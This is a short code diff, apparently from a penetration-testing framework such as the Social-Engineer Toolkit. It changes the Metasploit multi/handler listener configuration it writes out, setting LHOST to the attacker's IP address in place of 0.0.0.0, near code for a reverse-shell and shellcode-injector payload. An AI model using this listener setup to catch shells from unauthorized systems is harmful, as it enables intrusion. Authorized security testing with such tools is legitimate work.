@@ -419,7 +419,7 @@ try:
                                 filewrite = file("%s/meta_config_multipyinjector" % (setdir), "a")
                                 port_check = check_ports("%s/meta_config_multipyinjector" % (setdir), shellcode_port)
                                 if port_check == False:
-                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset LHOST 0.0.0.0\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n\n" % (choice9,shellcode_port))
+                                    filewrite.write("use exploit/multi/handler\nset PAYLOAD %s\nset LHOST %s\nset LPORT %s\nset ExitOnSession false\nset EnableStageEncoding true\nexploit -j\n\n" % (choice9, ipaddr, shellcode_port))
                                     filewrite.close()
 
                             if validate_ip(choice2) == False:
@@ -663,7 +663,7 @@ try:
                 if port_check == False:
                     filewrite.write("use exploit/multi/handler\n")
                     filewrite.write("set PAYLOAD "+choice1+"\n")
-                    filewrite.write("set LHOST 0.0.0.0" + "\n")
+                    filewrite.write("set LHOST " + ipaddr + "\n")
                     if flag == 0:
                         filewrite.write("set LPORT "+choice3+"\n")
 
@@ -727,7 +727,7 @@ if attack_vector == "multiattack":
     multiattack.close()
 if os.path.isfile("%s/fileformat.file" % (setdir)):
     filewrite=file("%s/payload.options" % (setdir), "w")
-    filewrite.write(choice1+" 0.0.0.0 " + choice3)
+    filewrite.write(choice1 + " " + ipaddr + " " + choice3)
     filewrite.close()
 
 if choice1 == "set/reverse_shell":
